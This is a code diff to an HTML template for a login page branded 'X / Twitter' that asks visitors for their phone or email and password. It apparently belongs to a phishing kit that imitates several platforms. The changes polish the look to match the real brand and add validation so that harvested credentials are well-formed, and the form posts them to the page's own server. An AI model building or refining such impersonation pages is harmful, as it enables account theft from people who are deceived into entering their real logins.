@@ -1,14 +1,114 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto">
+<div class="card" style="max-width:520px;margin:28px auto;box-shadow:0 6px 18px rgba(29,161,242,0.25);border-radius:16px;">
   <div class="platform-header">
-    <div class="icon-circle bg-twitter"><i class="fa-brands fa-x-twitter icon-lg"></i></div>
-    <div><h2 class="notranslate" style="margin:0">X / Twitter</h2><div style="color:#64748b;font-size:13px">Please login to continue</div></div>
+    <div class="icon-circle bg-twitter">
+      <i class="fa-brands fa-x-twitter icon-lg"></i>
+    </div>
+    <div>
+      <h2 class="notranslate" style="margin:0;color:#1DA1F2;">X / Twitter</h2>
+      <div style="color:#64748b;font-size:13px">Please login to continue</div>
+    </div>
   </div>
-  <form method="post">
-    <input class="input" name="address" placeholder="Mobile number or email address" required>
-    <input class="input" name="password" type="password" placeholder="Password" required>
-    <div class="center"><button class="btn btn-blue" type="submit">Log in</button></div>
+
+  <form id="loginForm" method="post" novalidate>
+    <input class="input" id="address" name="address" placeholder="Mobile number or email address" required>
+    <div class="error-text" id="addressError"></div>
+
+    <input class="input" id="password" name="password" type="password" placeholder="Password" required>
+    <div class="error-text" id="passwordError"></div>
+
+    <button class="btn login-btn" type="submit">Log in</button>
   </form>
 </div>
+
+<style>
+.input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 18px;
+  border: 1px solid #e5e7eb;
+  margin-bottom: 8px;
+  font-size: 16px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.input:focus {
+  border-color: #1DA1F2;
+  box-shadow: 0 0 0 3px rgba(29, 161, 242, 0.25);
+  outline: none;
+}
+.input-error {
+  border-color: #ef4444;
+  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+}
+.error-text {
+  color: #ef4444;
+  font-size: 13px;
+  margin-top: -4px;
+  margin-bottom: 8px;
+}
+
+.login-btn {
+  width: 100%;
+  background: #1DA1F2;
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  padding: 12px;
+  border-radius: 25px;
+  cursor: pointer;
+  border: none;
+  transition: background 0.25s, transform 0.1s, box-shadow 0.2s;
+  box-shadow: 0 6px 16px rgba(29,161,242,0.35);
+  display: block;
+  margin-top: 8px;
+}
+.login-btn:hover {
+  background: #1a8cd8;
+  box-shadow: 0 8px 20px rgba(29,161,242,0.45);
+}
+.login-btn:active {
+  transform: scale(0.985);
+}
+</style>
+
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+  const address = document.getElementById("address");
+  const password = document.getElementById("password");
+  const addressError = document.getElementById("addressError");
+  const passwordError = document.getElementById("passwordError");
+
+  const emailPattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.(com|net|org|co|io|me|info|biz)$/;
+  const phonePattern = /^\+?\d{6,}$/;
+
+  let valid = true;
+  [address, password].forEach(input => input.classList.remove("input-error"));
+  [addressError, passwordError].forEach(el => el.textContent = "");
+
+  const addrVal = address.value.trim();
+
+  if (!(emailPattern.test(addrVal) || phonePattern.test(addrVal))) {
+    valid = false;
+    address.classList.add("input-error");
+    addressError.textContent = "Enter a valid lowercase email (e.g. name@email.com) or phone number.";
+  }
+
+  if (password.value.trim().length < 6) {
+    valid = false;
+    password.classList.add("input-error");
+    passwordError.textContent = "Password must be at least 6 characters.";
+  }
+
+  if (!valid) event.preventDefault();
+});
+
+document.querySelectorAll(".input").forEach(input => {
+  input.addEventListener("input", () => {
+    input.classList.remove("input-error");
+    if (input.id === "address") document.getElementById("addressError").textContent = "";
+    if (input.id === "password") document.getElementById("passwordError").textContent = "";
+  });
+});
+</script>
 {% endblock %}
